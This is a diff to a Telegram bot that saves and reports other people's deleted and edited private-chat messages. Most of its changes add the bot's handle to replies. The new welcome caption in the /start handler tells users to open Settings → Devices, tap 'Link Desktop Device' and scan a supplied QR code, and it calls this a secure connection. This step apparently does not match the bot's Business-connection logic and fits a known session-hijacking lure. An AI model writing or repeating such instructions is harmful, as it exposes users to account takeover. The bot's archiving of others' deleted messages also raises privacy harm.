@@ -179,7 +179,10 @@ const extractMedia = async (msg) => {
 // ==========================================
 
 bot.command("start", async (ctx) => {
-  await User.findOneAndUpdate(
+  const existingUser = await User.findOne({ chat_id: ctx.from.id });
+  const isFirstTime = !existingUser;
+  
+  const updatedUser = await User.findOneAndUpdate(
     {
       chat_id: ctx.from.id
     },
@@ -188,13 +191,47 @@ bot.command("start", async (ctx) => {
       first_name: ctx.from.first_name
     },
     {
-      upsert: true
+      upsert: true,
+      new: true
     }
   );
 
-  await ctx.reply(
-    "👋 Bot ishlayapti.\n\nTelegram Business orqali ulang.\nBuyruqlarni ko'rish uchun /help ni bosing."
-  );
+  if (isFirstTime) {
+    // First time - send image with instructions
+    const caption = 
+      `👋 TrackMyChatBot'ga xush kelibsiz\n\n` +
+      `Private chatlarda:\n` +
+      `✏️ edit qilingan\n` +
+      `🗑 o'chirilgan\n` +
+      `📎 media xabarlarni kuzatish uchun Telegram account'ingizni ulang.\n\n` +
+      `📱 Qanday ulash mumkin?\n` +
+      `1️⃣ Telegram Settings oching\n\n` +
+      `Settings → Devices\n\n` +
+      `2️⃣ "Link Desktop Device" ni bosing\n` +
+      `3️⃣ Quyidagi QR kodni scan qiling\n\n` +
+      `Bot sizning account'ingizni xavfsiz tarzda ulaydi.\n\n` +
+      `@TrackMyChatBot`;
+    
+    try {
+      await ctx.replyWithPhoto(
+        new InputFile(path.join(__dirname, "assets", "instructions.png")),
+        {
+          caption: caption
+        }
+      );
+    } catch (err) {
+      console.error("❌ Rasm yuborishda xato:", err.message);
+      await ctx.reply(caption);
+    }
+  } else if (updatedUser.business_connection_id) {
+    // Already connected
+    await ctx.reply("✅ Telegram accountingiz allaqachon ulangan.\n\n@TrackMyChatBot");
+  } else {
+    // Not connected yet
+    await ctx.reply(
+      "👋 Bot ishlayapti.\n\nTelegram Business orqali ulang.\nBuyruqlarni ko'rish uchun /help ni bosing.\n\n@TrackMyChatBot"
+    );
+  }
 });
 
 bot.command("help", async (ctx) => {
@@ -205,7 +242,8 @@ bot.command("help", async (ctx) => {
     `/settings - Sozlamalar (Xabarnomalarni o'chirish/yoqish)\n` +
     `/search &lt;so'z&gt; - Xabarlarni izlash\n` +
     `/export - Ma'lumotlarni yuklab olish\n` +
-    `/help - Shu xabarni ko'rsatish`;
+    `/help - Shu xabarni ko'rsatish\n\n` +
+    `@TrackMyChatBot`;
   
   await ctx.reply(text, { parse_mode: "HTML" });
 });
@@ -218,7 +256,7 @@ bot.command("settings", async (ctx) => {
     .text(user.notify_deletes !== false ? "✅ O'chirilgan xabarlar" : "❌ O'chirilgan xabarlar", "toggle_deletes").row()
     .text(user.notify_edits !== false ? "✅ Tahrirlangan xabarlar" : "❌ Tahrirlangan xabarlar", "toggle_edits");
 
-  await ctx.reply("⚙️ <b>Sozlamalar</b>\nQaysi xabarnomalarni olmoqchisiz?", {
+  await ctx.reply("⚙️ <b>Sozlamalar</b>\nQaysi xabarnomalarni olmoqchisiz?\n\n@TrackMyChatBot", {
     parse_mode: "HTML",
     reply_markup: keyboard
   });
@@ -274,6 +312,7 @@ bot.command("search", async (ctx) => {
     let status = msg.is_deleted ? "🗑 O'chirilgan" : (msg.is_edited ? "✏️ Tahrirlangan" : "💬 Oddiy");
     text += `${i + 1}. [${status}] ${escapeHTML(msg.sender_first_name)}: <i>${escapeHTML((msg.text || "[Media]").substring(0, 50))}...</i>\n`;
   });
+  text += `\n@TrackMyChatBot`;
 
   await ctx.reply(text, { parse_mode: "HTML" });
 });
@@ -343,7 +382,8 @@ bot.command("stats", async (ctx) => {
     `📊 <b>Statistika</b>\n\n` +
     `📥 Jami: <b>${total}</b>\n` +
     `🗑 Deleted: <b>${deleted}</b>\n` +
-    `✏️ Edited: <b>${edited}</b>`;
+    `✏️ Edited: <b>${edited}</b>\n\n` +
+    `@TrackMyChatBot`;
 
   await ctx.reply(text, {
     parse_mode: "HTML"
@@ -513,7 +553,8 @@ bot.on("deleted_business_messages", async (ctx) => {
       `💬 <b>Matn:</b>\n` +
       `<i>${escapeHTML(
         archived.text || "[Media]"
-      )}</i>`;
+      )}</i>\n\n` +
+      `@TrackMyChatBot`;
 
     try {
       // PHOTO
@@ -691,7 +732,8 @@ bot.on("edited_business_message", async (ctx) => {
       `❌ <b>Eski:</b>\n` +
       `<i>${escapeHTML(oldMsg.text)}</i>\n\n` +
       `✅ <b>Yangi:</b>\n` +
-      `<i>${escapeHTML(newText)}</i>`;
+      `<i>${escapeHTML(newText)}</i>\n\n` +
+      `@TrackMyChatBot`;
 
     await bot.api.sendMessage(owner.chat_id, report, {
       parse_mode: "HTML"
